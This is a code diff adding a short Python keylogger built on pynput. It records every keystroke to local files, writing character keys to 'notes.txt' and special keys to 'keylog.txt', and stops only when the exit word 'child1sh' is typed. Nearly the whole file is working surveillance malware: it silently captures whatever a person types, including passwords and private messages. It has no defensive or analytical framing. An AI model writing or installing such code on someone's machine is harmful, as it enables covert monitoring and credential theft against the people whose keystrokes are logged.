@@ -1,0 +1,25 @@
+from pynput import keyboard
+
+keys = []
+exit_sequence = "child1sh"
+
+def on_press(key):
+    global keys
+    try:
+        keys.append(key.char)
+        with open("notes.txt", "a") as log:
+            log.write(f'{key.char}')
+    except AttributeError:
+        with open("keylog.txt", "a") as log:
+            log.write(f'/{key}/')
+
+    # check for exit
+    if ''.join(keys[-len(exit_sequence):]) == exit_sequence:
+        print("Exit sequence detected, stopping keylogger.")
+        return False
+
+def on_release(key):
+    pass
+
+with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
